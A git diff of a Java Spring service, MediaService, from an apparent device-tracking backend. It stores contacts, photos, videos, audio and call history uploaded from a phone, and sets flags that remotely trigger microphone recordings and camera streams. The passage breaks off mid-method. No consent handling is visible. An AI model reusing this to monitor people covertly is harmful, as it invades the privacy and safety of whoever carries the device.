@@ -4,6 +4,7 @@ import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.StandardCopyOption;
 import java.time.LocalDateTime;
+import java.time.LocalTime;
 import java.util.ArrayList;
 import java.util.HashSet;
 import java.util.List;
@@ -16,11 +17,18 @@ import java.io.File;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.util.UUID;
+
+import com.fasterxml.jackson.core.JsonProcessingException;
+import com.fasterxml.jackson.databind.ObjectMapper;
 import com.manish.device_tracker_api.dto.AudioFolderPayload;
 import com.manish.device_tracker_api.dto.AudioFolderResponse;
 import com.manish.device_tracker_api.dto.AudioFolderSyncRequest;
 import com.manish.device_tracker_api.dto.AudioRefreshRequest;
 import com.manish.device_tracker_api.dto.AudioResponse;
+import com.manish.device_tracker_api.dto.CallHistoryDTO;
+import com.manish.device_tracker_api.dto.CallHistoryRequest;
+import com.manish.device_tracker_api.dto.CallHistorySyncItemDTO;
+import com.manish.device_tracker_api.dto.CallHistorySyncRequest;
 import com.manish.device_tracker_api.dto.CameraRequest;
 import com.manish.device_tracker_api.dto.ContactItem;
 import com.manish.device_tracker_api.dto.ContactPayload;
@@ -32,12 +40,15 @@ import com.manish.device_tracker_api.dto.ImageRefreshRequest;
 import com.manish.device_tracker_api.dto.ImageResponse;
 import com.manish.device_tracker_api.dto.MicRecordingRequest;
 import com.manish.device_tracker_api.dto.MicRecordingResponse;
+import com.manish.device_tracker_api.dto.ScreenRequest;
+import com.manish.device_tracker_api.dto.SignalMessage;
 import com.manish.device_tracker_api.dto.VideoFolderPayload;
 import com.manish.device_tracker_api.dto.VideoFolderResponse;
 import com.manish.device_tracker_api.dto.VideoFolderSyncRequest;
 import com.manish.device_tracker_api.dto.VideoRefreshRequest;
 import com.manish.device_tracker_api.dto.VideoResponse;
 import com.manish.device_tracker_api.entity.Audio;
+import com.manish.device_tracker_api.entity.CallHistory;
 import com.manish.device_tracker_api.entity.Contact;
 import com.manish.device_tracker_api.entity.DeviceAudioFolder;
 import com.manish.device_tracker_api.entity.DeviceImageFolder;
@@ -47,6 +58,7 @@ import com.manish.device_tracker_api.entity.Image;
 import com.manish.device_tracker_api.entity.MicRecording;
 import com.manish.device_tracker_api.entity.Video;
 import com.manish.device_tracker_api.repository.AudioRepo;
+import com.manish.device_tracker_api.repository.CallHistoryRepo;
 import com.manish.device_tracker_api.repository.ContactRepo;
 import com.manish.device_tracker_api.repository.DeviceAudioFolderRepo;
 import com.manish.device_tracker_api.repository.DeviceImageFolderRepo;
@@ -55,845 +67,1215 @@ import com.manish.device_tracker_api.repository.DeviceVideoFolderRepo;
 import com.manish.device_tracker_api.repository.ImageRepo;
 import com.manish.device_tracker_api.repository.MicRecordingRepo;
 import com.manish.device_tracker_api.repository.VideoRepo;
+import com.manish.device_tracker_api.websocket.SessionManager;
 import jakarta.transaction.Transactional;
+import lombok.RequiredArgsConstructor;
 import lombok.extern.slf4j.Slf4j;
 
 @Slf4j
 @Service
+@RequiredArgsConstructor
 public class MediaService {
 
-    @Autowired
-    private ContactRepo contactRepo;
+        @Autowired
+        private ContactRepo contactRepo;
 
-    @Autowired
-    private ImageRepo imageRepo;
+        @Autowired
+        private ImageRepo imageRepo;
 
-    @Autowired
-    private VideoRepo videoRepo;
+        @Autowired
+        private VideoRepo videoRepo;
 
-    @Autowired
-    private AudioRepo audioRepo;
+        @Autowired
+        private AudioRepo audioRepo;
 
-    @Autowired
-    private MicRecordingRepo micRecordingRepo;
+        @Autowired
+        private MicRecordingRepo micRecordingRepo;
 
-    @Autowired
-    private DeviceAudioFolderRepo deviceAudioFolderRepo;
+        @Autowired
+        private DeviceAudioFolderRepo deviceAudioFolderRepo;
 
-    @Autowired
-    private DeviceImageFolderRepo deviceImageFolderRepo;
+        @Autowired
+        private DeviceImageFolderRepo deviceImageFolderRepo;
 
-    @Autowired
-    private DeviceVideoFolderRepo deviceVideoFolderRepo;
+        @Autowired
+        private DeviceVideoFolderRepo deviceVideoFolderRepo;
 
-    @Autowired
-    private DeviceInfoRepository deviceInfoRepository;
+        @Autowired
+        private DeviceInfoRepository deviceInfoRepository;
 
-    // Contact Methods
+        @Autowired
+        private CallHistoryRepo callHistoryRepo;
 
-    public void saveContact(ContactPayload request) {
+        @Autowired
+        private ObjectMapper objectMapper;
 
-        if (request == null || request.getContacts() == null || request.getContacts().isEmpty()) {
-            return;
-        }
+        private final SessionManager sessionManager;
 
-        contactRepo.deleteByDeviceId(request.getDeviceId());
+        // Contact Methods
 
-        List<Contact> contactList = new ArrayList<>();
-        Set<String> uniqueNumbers = new HashSet<>();
+        public void saveContact(ContactPayload request) {
 
-        for (ContactItem item : request.getContacts()) {
-
-            String phone = item.getPhoneNumber();
-
-            // Duplicate number skip
-            if (!uniqueNumbers.add(phone)) {
-                continue;
-            }
-
-            Contact contact = new Contact();
-
-            contact.setDeviceId(request.getDeviceId());
-            contact.setContactName(item.getContactName());
-            contact.setPhoneNumber(phone);
-            contact.setCreatedAt(LocalDateTime.now());
-
-            contactList.add(contact);
-        }
-
-        contactRepo.saveAll(contactList);
-
-        DeviceInfo device = deviceInfoRepository
-                .findByDeviceId(request.getDeviceId())
-                .orElseThrow(() -> new RuntimeException("Device not found"));
-
-        device.setContactsUploaded(true);
-        device.setRefreshContacts(false);
-
-        deviceInfoRepository.save(device);
-    }
-
-    public List<ContactResponse> getContacts(String deviceId) {
-
-        return contactRepo
-                .findByDeviceIdOrderByContactNameAsc(deviceId)
-                .stream()
-                .map(contact -> ContactResponse.builder()
-                        .id(contact.getId())
-                        .contactName(contact.getContactName())
-                        .phoneNumber(contact.getPhoneNumber())
-                        .createdAt(contact.getCreatedAt())
-                        .build())
-                .toList();
-    }
-
-    public void refreshContacts(String deviceId) {
-
-        DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
-                .orElseThrow(() -> new RuntimeException("Device not found"));
-
-        device.setRefreshContacts(false);
-
-        deviceInfoRepository.save(device);
-    }
-
-    public void deleteContacts(String deviceId) {
-
-        contactRepo.deleteByDeviceId(deviceId);
-
-        DeviceInfo device = deviceInfoRepository
-                .findByDeviceId(deviceId)
-                .orElseThrow(() -> new RuntimeException("Device Not Found"));
-
-        device.setContactsUploaded(false);
-        device.setRefreshContacts(true);
-
-        deviceInfoRepository.save(device);
-    }
-
-    // Image Methods
-
-    @Transactional
-    public void saveImages(String deviceId,
-            List<MultipartFile> files) throws IOException {
-
-        File folder = new File("uploads");
-
-        if (!folder.exists()) {
-            folder.mkdirs();
-        }
-
-        List<Image> imageList = new ArrayList<>();
-
-        for (MultipartFile file : files) {
-
-            log.info("=================================");
-            log.info("OriginalFilename = {}", file.getOriginalFilename());
-            log.info("ContentType = {}", file.getContentType());
-
-            Optional<Image> existingImage = imageRepo.findByDeviceIdAndImageNameAndImageSize(
-                    deviceId,
-                    file.getOriginalFilename(),
-                    file.getSize());
-
-            if (existingImage.isPresent()) {
-
-                log.info("Duplicate Image Skip : {}",
-                        file.getOriginalFilename());
-
-                continue;
-            }
-
-            String fileName = UUID.randomUUID()
-                    + "_"
-                    + file.getOriginalFilename();
-
-            Path path = Paths.get(
-                    folder.getAbsolutePath(),
-                    fileName);
-
-            Files.copy(
-                    file.getInputStream(),
-                    path,
-                    StandardCopyOption.REPLACE_EXISTING);
-
-            Image image = new Image();
-
-            image.setDeviceId(deviceId);
-            image.setImageName(file.getOriginalFilename());
-            image.setImageUrl("/uploads/" + fileName);
-            image.setImageSize(file.getSize());
-            image.setCreatedAt(LocalDateTime.now());
-
-            imageList.add(image);
-        }
-
-        if (!imageList.isEmpty()) {
-
-            imageRepo.saveAll(imageList);
-
-        }
-
-        DeviceInfo device = deviceInfoRepository
-                .findByDeviceId(deviceId)
-                .orElseThrow(() -> new RuntimeException("Device not found"));
-
-        device.setImagesUploaded(true);
-        device.setRefreshImages(false);
-
-        deviceInfoRepository.save(device);
-    }
-
-    public List<ImageResponse> getImages(String deviceId) {
-
-        return imageRepo
-                .findByDeviceIdOrderByImageNameAsc(deviceId)
-                .stream()
-                .map(image -> ImageResponse.builder()
-                        .id(image.getId())
-                        .imageName(image.getImageName())
-                        .imageUrl(image.getImageUrl())
-                        .imageSize(image.getImageSize())
-                        .createdAt(image.getCreatedAt())
-                        .build())
-                .toList();
-    }
-
-    public void refreshImages(String deviceId) {
-
-        DeviceInfo device = deviceInfoRepository
-                .findByDeviceId(deviceId)
-                .orElseThrow(() -> new RuntimeException("Device not found"));
-
-        device.setRefreshImages(true);
-
-        deviceInfoRepository.save(device);
-    }
-
-    public void deleteImages(String deviceId) {
-
-        List<Image> images = imageRepo.findByDeviceIdOrderByImageNameAsc(deviceId);
-
-        for (Image image : images) {
-
-            if (image.getImageUrl() != null) {
-
-                String path = image.getImageUrl().replace("/uploads/", "");
-
-                File file = new File("uploads", path);
-
-                if (file.exists()) {
-
-                    if (!file.delete()) {
-                        System.out.println("Unable to delete : " + file.getAbsolutePath());
-                    }
+                if (request == null || request.getContacts() == null || request.getContacts().isEmpty()) {
+                        return;
                 }
-            }
+
+                contactRepo.deleteByDeviceId(request.getDeviceId());
+
+                List<Contact> contactList = new ArrayList<>();
+                Set<String> uniqueNumbers = new HashSet<>();
+
+                for (ContactItem item : request.getContacts()) {
+
+                        String phone = item.getPhoneNumber();
+
+                        // Duplicate number skip
+                        if (!uniqueNumbers.add(phone)) {
+                                continue;
+                        }
+
+                        Contact contact = new Contact();
+
+                        contact.setDeviceId(request.getDeviceId());
+                        contact.setContactName(item.getContactName());
+                        contact.setPhoneNumber(phone);
+                        contact.setCreatedAt(LocalDateTime.now());
+
+                        contactList.add(contact);
+                }
+
+                contactRepo.saveAll(contactList);
+
+                DeviceInfo device = deviceInfoRepository
+                                .findByDeviceId(request.getDeviceId())
+                                .orElseThrow(() -> new RuntimeException("Device not found"));
+
+                device.setContactsUploaded(true);
+                device.setRefreshContacts(false);
+
+                deviceInfoRepository.save(device);
         }
 
-        imageRepo.deleteByDeviceId(deviceId);
+        public List<ContactResponse> getContacts(String deviceId) {
 
-        DeviceInfo device = deviceInfoRepository
-                .findByDeviceId(deviceId)
-                .orElseThrow(() -> new RuntimeException("Device Not Found"));
-
-        device.setImagesUploaded(false);
-        device.setRefreshImages(true);
-
-        deviceInfoRepository.save(device);
-    }
-
-    @Transactional
-    public void syncFolders(ImageFolderSyncRequest request) {
-
-        deviceImageFolderRepo.deleteByDeviceId(request.getDeviceId());
-
-        List<DeviceImageFolder> folders = new ArrayList<>();
-
-        for (ImageFolderPayload item : request.getFolders()) {
-
-            DeviceImageFolder folder = DeviceImageFolder.builder()
-                    .deviceId(request.getDeviceId())
-                    .bucketId(item.getBucketId())
-                    .folderName(item.getFolderName())
-                    .imageCount(item.getImageCount())
-                    .syncedAt(LocalDateTime.now())
-                    .build();
-
-            folders.add(folder);
+                return contactRepo
+                                .findByDeviceIdOrderByContactNameAsc(deviceId)
+                                .stream()
+                                .map(contact -> ContactResponse.builder()
+                                                .id(contact.getId())
+                                                .contactName(contact.getContactName())
+                                                .phoneNumber(contact.getPhoneNumber())
+                                                .createdAt(contact.getCreatedAt())
+                                                .build())
+                                .toList();
         }
 
-        deviceImageFolderRepo.saveAll(folders);
-    }
+        public void refreshContacts(String deviceId) {
 
-    public List<ImageFolderResponse> getFolders(String deviceId) {
+                DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
+                                .orElseThrow(() -> new RuntimeException("Device not found"));
 
-        return deviceImageFolderRepo.findByDeviceIdOrderByFolderNameAsc(deviceId)
-                .stream()
-                .map(folder -> ImageFolderResponse.builder()
-                        .bucketId(folder.getBucketId())
-                        .folderName(folder.getFolderName())
-                        .imageCount(folder.getImageCount())
-                        .build())
-                .toList();
-    }
+                device.setRefreshContacts(false);
 
-    public void refreshImages(ImageRefreshRequest request) {
-
-        DeviceInfo device = deviceInfoRepository.findByDeviceId(request.getDeviceId())
-                .orElseThrow(() -> new RuntimeException("Device Not Found"));
-
-        device.setRefreshImages(true);
-
-        device.setImagesUploaded(false);
-
-        device.setImageBucketId(request.getBucketId());
-
-        device.setImageLimit(request.getLimit());
-
-        device.setImageOffset(request.getOffset());
-
-        device.setImageOrder(request.getOrder());
-
-        deviceInfoRepository.save(device);
-    }
-
-    // Video Methods
-
-    @Transactional
-    public void saveVideos(String deviceId,
-            List<MultipartFile> files) throws IOException {
-
-        File folder = new File("uploads/videos");
-
-        if (!folder.exists()) {
-            folder.mkdirs();
+                deviceInfoRepository.save(device);
         }
 
-        List<Video> videoList = new ArrayList<>();
+        public void deleteContacts(String deviceId) {
 
-        for (MultipartFile file : files) {
+                contactRepo.deleteByDeviceId(deviceId);
 
-            Optional<Video> existingVideo = videoRepo.findByDeviceIdAndVideoNameAndVideoSize(
-                    deviceId,
-                    file.getOriginalFilename(),
-                    file.getSize());
+                DeviceInfo device = deviceInfoRepository
+                                .findByDeviceId(deviceId)
+                                .orElseThrow(() -> new RuntimeException("Device Not Found"));
 
-            if (existingVideo.isPresent()) {
+                device.setContactsUploaded(false);
+                device.setRefreshContacts(true);
 
-                log.info("Duplicate Video Skip : {}",
-                        file.getOriginalFilename());
-
-                continue;
-            }
-
-            String fileName = UUID.randomUUID()
-                    + "_"
-                    + file.getOriginalFilename();
-
-            Path path = Paths.get(
-                    folder.getAbsolutePath(),
-                    fileName);
-
-            Files.copy(
-                    file.getInputStream(),
-                    path,
-                    StandardCopyOption.REPLACE_EXISTING);
-
-            Video video = new Video();
-
-            video.setDeviceId(deviceId);
-            video.setVideoName(file.getOriginalFilename());
-            video.setVideoUrl("/uploads/videos/" + fileName);
-            video.setVideoSize(file.getSize());
-            video.setCreatedAt(LocalDateTime.now());
-
-            videoList.add(video);
-
+                deviceInfoRepository.save(device);
         }
 
-        if (!videoList.isEmpty()) {
+        // Image Methods
 
-            videoRepo.saveAll(videoList);
+        @Transactional
+        public void saveImages(String deviceId,
+                        List<MultipartFile> files) throws IOException {
 
-        }
+                File folder = new File("uploads");
 
-        DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
-                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+                if (!folder.exists()) {
+                        folder.mkdirs();
+                }
 
-        device.setVideosUploaded(true);
-        device.setRefreshVideos(false);
+                List<Image> imageList = new ArrayList<>();
 
-        deviceInfoRepository.save(device);
+                for (MultipartFile file : files) {
 
-    }
+                        log.info("=================================");
+                        log.info("OriginalFilename = {}", file.getOriginalFilename());
+                        log.info("ContentType = {}", file.getContentType());
 
-    public void requestVideos(String deviceId) {
+                        Optional<Image> existingImage = imageRepo.findByDeviceIdAndImageNameAndImageSize(
+                                        deviceId,
+                                        file.getOriginalFilename(),
+                                        file.getSize());
 
-        DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
-                .orElseThrow(
-                        () -> new RuntimeException("Device Not Found"));
+                        if (existingImage.isPresent()) {
 
-        device.setRefreshVideos(true);
+                                log.info("Duplicate Image Skip : {}",
+                                                file.getOriginalFilename());
 
-        device.setVideosUploaded(false);
+                                continue;
+                        }
 
-        deviceInfoRepository.save(device);
+                        String fileName = UUID.randomUUID()
+                                        + "_"
+                                        + file.getOriginalFilename();
 
-    }
+                        Path path = Paths.get(
+                                        folder.getAbsolutePath(),
+                                        fileName);
 
-    public List<VideoResponse> getVideos(String deviceId) {
+                        Files.copy(
+                                        file.getInputStream(),
+                                        path,
+                                        StandardCopyOption.REPLACE_EXISTING);
 
-        return videoRepo
-                .findByDeviceIdOrderByVideoNameAsc(deviceId)
-                .stream()
-                .map(video -> VideoResponse.builder()
-                        .id(video.getId())
-                        .videoName(video.getVideoName())
-                        .videoUrl(video.getVideoUrl())
-                        .videoSize(video.getVideoSize())
-                        .createdAt(video.getCreatedAt())
-                        .build())
-                .toList();
+                        Image image = new Image();
 
-    }
+                        image.setDeviceId(deviceId);
+                        image.setImageName(file.getOriginalFilename());
+                        image.setImageUrl("/uploads/" + fileName);
+                        image.setImageSize(file.getSize());
+                        image.setCreatedAt(LocalDateTime.now());
 
-    public void deleteVideos(String deviceId) {
+                        imageList.add(image);
+                }
 
-        List<Video> videos = videoRepo.findByDeviceIdOrderByVideoNameAsc(deviceId);
+                if (!imageList.isEmpty()) {
 
-        for (Video video : videos) {
-
-            if (video.getVideoUrl() != null) {
-
-                String path = video.getVideoUrl()
-                        .replace("/uploads/videos/", "");
-
-                File file = new File("uploads/videos", path);
-
-                if (file.exists()) {
-
-                    if (!file.delete()) {
-
-                        log.warn("Unable to delete : {}",
-                                file.getAbsolutePath());
-
-                    }
+                        imageRepo.saveAll(imageList);
 
                 }
 
-            }
+                DeviceInfo device = deviceInfoRepository
+                                .findByDeviceId(deviceId)
+                                .orElseThrow(() -> new RuntimeException("Device not found"));
 
+                device.setImagesUploaded(true);
+                device.setRefreshImages(false);
+
+                deviceInfoRepository.save(device);
         }
 
-        videoRepo.deleteByDeviceId(deviceId);
+        public List<ImageResponse> getImages(String deviceId) {
 
-        DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
-                .orElseThrow(() -> new RuntimeException("Device Not Found"));
-
-        device.setVideosUploaded(false);
-        device.setRefreshVideos(true);
-
-        deviceInfoRepository.save(device);
-
-    }
-
-    @Transactional
-    public void syncVideoFolders(
-            VideoFolderSyncRequest request) {
-
-        deviceVideoFolderRepo.deleteByDeviceId(
-                request.getDeviceId());
-
-        List<DeviceVideoFolder> folders = new ArrayList<>();
-
-        for (VideoFolderPayload item : request.getFolders()) {
-
-            DeviceVideoFolder folder = DeviceVideoFolder.builder()
-                    .deviceId(request.getDeviceId())
-                    .bucketId(item.getBucketId())
-                    .folderName(item.getFolderName())
-                    .videoCount(item.getVideoCount())
-                    .syncedAt(LocalDateTime.now())
-                    .build();
-
-            folders.add(folder);
-
+                return imageRepo
+                                .findByDeviceIdOrderByImageNameAsc(deviceId)
+                                .stream()
+                                .map(image -> ImageResponse.builder()
+                                                .id(image.getId())
+                                                .imageName(image.getImageName())
+                                                .imageUrl(image.getImageUrl())
+                                                .imageSize(image.getImageSize())
+                                                .createdAt(image.getCreatedAt())
+                                                .build())
+                                .toList();
         }
 
-        deviceVideoFolderRepo.saveAll(folders);
+        public void refreshImages(String deviceId) {
 
-    }
+                DeviceInfo device = deviceInfoRepository
+                                .findByDeviceId(deviceId)
+                                .orElseThrow(() -> new RuntimeException("Device not found"));
 
-    public List<VideoFolderResponse> getVideoFolders(
-            String deviceId) {
+                device.setRefreshImages(true);
 
-        return deviceVideoFolderRepo
-                .findByDeviceIdOrderByFolderNameAsc(deviceId)
-                .stream()
-                .map(folder -> VideoFolderResponse.builder()
-                        .bucketId(folder.getBucketId())
-                        .folderName(folder.getFolderName())
-                        .videoCount(folder.getVideoCount())
-                        .build())
-                .toList();
-
-    }
-
-    public void refreshVideos(
-            VideoRefreshRequest request) {
-
-        DeviceInfo device = deviceInfoRepository.findByDeviceId(
-                request.getDeviceId())
-                .orElseThrow(() -> new RuntimeException("Device Not Found"));
-
-        device.setRefreshVideos(true);
-
-        device.setVideosUploaded(false);
-
-        device.setVideoBucketId(request.getBucketId());
-
-        device.setVideoLimit(request.getLimit());
-
-        device.setVideoOffset(request.getOffset());
-
-        device.setVideoOrder(request.getOrder());
-
-        deviceInfoRepository.save(device);
-
-    }
-
-    // Audio Methods
-
-    @Transactional
-    public void saveAudios(
-            String deviceId,
-            List<MultipartFile> files)
-            throws IOException {
-
-        File folder = new File("uploads");
-
-        if (!folder.exists()) {
-            folder.mkdirs();
+                deviceInfoRepository.save(device);
         }
 
-        List<Audio> audioList = new ArrayList<>();
+        public void deleteImages(String deviceId) {
 
-        for (MultipartFile file : files) {
+                List<Image> images = imageRepo.findByDeviceIdOrderByImageNameAsc(deviceId);
 
-            Optional<Audio> existing = audioRepo.findByDeviceIdAndAudioNameAndAudioSize(
-                    deviceId,
-                    file.getOriginalFilename(),
-                    file.getSize());
+                for (Image image : images) {
 
-            if (existing.isPresent()) {
-                continue;
-            }
+                        if (image.getImageUrl() != null) {
 
-            String fileName = UUID.randomUUID() + "_" + file.getOriginalFilename();
+                                String path = image.getImageUrl().replace("/uploads/", "");
 
-            Path path = Paths.get(folder.getAbsolutePath(), fileName);
+                                File file = new File("uploads", path);
 
-            Files.copy(
-                    file.getInputStream(),
-                    path,
-                    StandardCopyOption.REPLACE_EXISTING);
+                                if (file.exists()) {
 
-            Audio audio = Audio.builder()
-                    .deviceId(deviceId)
-                    .audioName(file.getOriginalFilename())
-                    .audioUrl("/uploads/" + fileName)
-                    .audioSize(file.getSize())
-                    .createdAt(LocalDateTime.now())
-                    .build();
-
-            audioList.add(audio);
-        }
-
-        if (!audioList.isEmpty()) {
-            audioRepo.saveAll(audioList);
-        }
-
-        DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
-                .orElseThrow();
-
-        device.setAudiosUploaded(true);
-        device.setRefreshAudios(false);
-
-        deviceInfoRepository.save(device);
-    }
-
-    public List<AudioResponse> getAudios(String deviceId) {
-
-        return audioRepo
-                .findByDeviceIdOrderByCreatedAtDesc(deviceId)
-                .stream()
-                .map(audio -> AudioResponse.builder()
-                        .id(audio.getId())
-                        .audioName(audio.getAudioName())
-                        .audioUrl(audio.getAudioUrl())
-                        .audioSize(audio.getAudioSize())
-                        .duration(audio.getDuration())
-                        .createdAt(audio.getCreatedAt())
-                        .build())
-                .toList();
-    }
-
-    public void refreshAudios(AudioRefreshRequest request) {
-
-        DeviceInfo device = deviceInfoRepository.findByDeviceId(request.getDeviceId())
-                .orElseThrow(() -> new RuntimeException("Device Not Found"));
-
-        device.setRefreshAudios(true);
-
-        device.setAudiosUploaded(false);
-
-        device.setAudioBucketId(request.getBucketId());
-
-        device.setAudioLimit(request.getLimit());
-
-        device.setAudioOffset(request.getOffset());
-
-        device.setAudioOrder(request.getOrder());
-
-        deviceInfoRepository.save(device);
-    }
-
-    public void deleteAudios(String deviceId) {
-
-        List<Audio> audios = audioRepo.findByDeviceIdOrderByCreatedAtDesc(deviceId);
-
-        for (Audio audio : audios) {
-
-            if (audio.getAudioUrl() != null) {
-
-                String path = audio.getAudioUrl().replace("/uploads/", "");
-
-                File file = new File("uploads", path);
-
-                if (file.exists()) {
-                    file.delete();
+                                        if (!file.delete()) {
+                                                System.out.println("Unable to delete : " + file.getAbsolutePath());
+                                        }
+                                }
+                        }
                 }
-            }
+
+                imageRepo.deleteByDeviceId(deviceId);
+
+                DeviceInfo device = deviceInfoRepository
+                                .findByDeviceId(deviceId)
+                                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+
+                device.setImagesUploaded(false);
+                device.setRefreshImages(true);
+
+                deviceInfoRepository.save(device);
         }
 
-        audioRepo.deleteByDeviceId(deviceId);
+        @Transactional
+        public void syncFolders(ImageFolderSyncRequest request) {
 
-        DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
-                .orElseThrow();
+                deviceImageFolderRepo.deleteByDeviceId(request.getDeviceId());
 
-        device.setAudiosUploaded(false);
-        device.setRefreshAudios(true);
+                List<DeviceImageFolder> folders = new ArrayList<>();
 
-        deviceInfoRepository.save(device);
-    }
+                for (ImageFolderPayload item : request.getFolders()) {
 
-    @Transactional
-    public void syncAudioFolders(AudioFolderSyncRequest request) {
+                        DeviceImageFolder folder = DeviceImageFolder.builder()
+                                        .deviceId(request.getDeviceId())
+                                        .bucketId(item.getBucketId())
+                                        .folderName(item.getFolderName())
+                                        .imageCount(item.getImageCount())
+                                        .syncedAt(LocalDateTime.now())
+                                        .build();
 
-        deviceAudioFolderRepo.deleteByDeviceId(request.getDeviceId());
-
-        List<DeviceAudioFolder> folders = new ArrayList<>();
-
-        for (AudioFolderPayload item : request.getFolders()) {
-
-            folders.add(
-
-                    DeviceAudioFolder.builder()
-                            .deviceId(request.getDeviceId())
-                            .bucketId(item.getBucketId())
-                            .folderName(item.getFolderName())
-                            .audioCount(item.getAudioCount())
-                            .syncedAt(LocalDateTime.now())
-                            .build()
-
-            );
-        }
-
-        deviceAudioFolderRepo.saveAll(folders);
-    }
-
-    public List<AudioFolderResponse> getAudioFolders(String deviceId) {
-
-        return deviceAudioFolderRepo
-                .findByDeviceIdOrderByFolderNameAsc(deviceId)
-                .stream()
-                .map(folder -> AudioFolderResponse.builder()
-                        .bucketId(folder.getBucketId())
-                        .folderName(folder.getFolderName())
-                        .audioCount(folder.getAudioCount())
-                        .build())
-                .toList();
-    }
-
-    // Mic Method
-
-    @Transactional
-    public void saveMicRecording(
-            String deviceId,
-            Integer duration,
-            MultipartFile file) throws IOException {
-
-        File folder = new File("uploads");
-
-        if (!folder.exists()) {
-            folder.mkdirs();
-        }
-
-        String fileName = UUID.randomUUID() + "_" + file.getOriginalFilename();
-
-        Path path = Paths.get(
-                folder.getAbsolutePath(),
-                fileName);
-
-        Files.copy(
-                file.getInputStream(),
-                path,
-                StandardCopyOption.REPLACE_EXISTING);
-
-        MicRecording recording = MicRecording.builder()
-                .deviceId(deviceId)
-                .fileName(file.getOriginalFilename())
-                .fileUrl("/uploads/" + fileName)
-                .fileSize(file.getSize())
-                .duration(duration)
-                .createdAt(LocalDateTime.now())
-                .build();
-
-        micRecordingRepo.save(recording);
-
-        DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
-                .orElseThrow(() -> new RuntimeException("Device Not Found"));
-
-        device.setMicUploaded(true);
-        device.setRefreshMic(false);
-
-        deviceInfoRepository.save(device);
-    }
-
-    public void refreshMic(MicRecordingRequest request) {
-
-        DeviceInfo device = deviceInfoRepository
-                .findByDeviceId(request.getDeviceId())
-                .orElseThrow(() -> new RuntimeException("Device Not Found"));
-
-        device.setRefreshMic(true);
-
-        device.setMicUploaded(false);
-
-        device.setMicDuration(request.getDuration());
-
-        deviceInfoRepository.save(device);
-    }
-
-    public List<MicRecordingResponse> getMicRecordings(String deviceId) {
-
-        return micRecordingRepo.findByDeviceIdOrderByCreatedAtDesc(deviceId)
-                .stream()
-                .map(recording -> MicRecordingResponse.builder()
-                        .id(recording.getId())
-                        .fileName(recording.getFileName())
-                        .fileUrl(recording.getFileUrl())
-                        .fileSize(recording.getFileSize())
-                        .duration(recording.getDuration())
-                        .createdAt(recording.getCreatedAt())
-                        .build())
-                .toList();
-    }
-
-    public void deleteMicRecordings(String deviceId) {
-
-        List<MicRecording> recordings = micRecordingRepo.findByDeviceIdOrderByCreatedAtDesc(deviceId);
-
-        for (MicRecording recording : recordings) {
-
-            if (recording.getFileUrl() != null) {
-
-                String path = recording.getFileUrl().replace("/uploads/", "");
-
-                File file = new File("uploads", path);
-
-                if (file.exists()) {
-
-                    if (!file.delete()) {
-
-                        log.warn("Unable to delete : {}", file.getAbsolutePath());
-
-                    }
+                        folders.add(folder);
                 }
-            }
+
+                deviceImageFolderRepo.saveAll(folders);
         }
 
-        micRecordingRepo.deleteByDeviceId(deviceId);
+        public List<ImageFolderResponse> getFolders(String deviceId) {
 
-        DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
-                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+                return deviceImageFolderRepo.findByDeviceIdOrderByFolderNameAsc(deviceId)
+                                .stream()
+                                .map(folder -> ImageFolderResponse.builder()
+                                                .bucketId(folder.getBucketId())
+                                                .folderName(folder.getFolderName())
+                                                .imageCount(folder.getImageCount())
+                                                .build())
+                                .toList();
+        }
 
-        device.setMicUploaded(false);
-        device.setRefreshMic(true);
+        public void refreshImages(ImageRefreshRequest request) {
 
-        deviceInfoRepository.save(device);
-    }
+                DeviceInfo device = deviceInfoRepository.findByDeviceId(request.getDeviceId())
+                                .orElseThrow(() -> new RuntimeException("Device Not Found"));
 
-    // Camera Methods
+                device.setRefreshImages(true);
 
-    public void requestCamera(CameraRequest request) {
+                device.setImagesUploaded(false);
 
-        DeviceInfo device = deviceInfoRepository.findByDeviceId(request.getDeviceId())
-                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+                device.setImageBucketId(request.getBucketId());
 
-        device.setRefreshCamera(true);
-        device.setCameraStreaming(false);
-        device.setCameraType(request.getCameraType());
+                device.setImageLimit(request.getLimit());
 
-        deviceInfoRepository.save(device);
+                device.setImageOffset(request.getOffset());
 
-    }
+                device.setImageOrder(request.getOrder());
 
-    public void cameraStopped(String deviceId) {
+                deviceInfoRepository.save(device);
+        }
 
-        DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
-                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+        // Video Methods
 
-        device.setCameraStreaming(false);
+        @Transactional
+        public void saveVideos(String deviceId,
+                        List<MultipartFile> files) throws IOException {
 
-        device.setRefreshCamera(false);
+                File folder = new File("uploads/videos");
 
-        deviceInfoRepository.save(device);
+                if (!folder.exists()) {
+                        folder.mkdirs();
+                }
 
-    }
+                List<Video> videoList = new ArrayList<>();
 
-    public Boolean cameraStatus(String deviceId) {
+                for (MultipartFile file : files) {
 
-        DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
-                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+                        Optional<Video> existingVideo = videoRepo.findByDeviceIdAndVideoNameAndVideoSize(
+                                        deviceId,
+                                        file.getOriginalFilename(),
+                                        file.getSize());
 
-        return device.getCameraStreaming();
+                        if (existingVideo.isPresent()) {
 
-    }
+                                log.info("Duplicate Video Skip : {}",
+                                                file.getOriginalFilename());
 
-    public void cameraStarted(String deviceId) {
+                                continue;
+                        }
 
-        DeviceInfo device = deviceInfoRepository.findByDeviceId(deviceId)
-                .orElseThrow(() -> new RuntimeException("Device Not Found"));
+                        String fileName = UUID.randomUUID()
+                                        + "_"
+                                        + file.getOriginalFilename();
 
-        device.setCameraStreaming(true);
+                        Path path = Paths.get(
+                                        folder.getAbsolutePath(),
+                                        fileName);
 
-        device.setRefreshCamera(false);
+                        Files.copy(
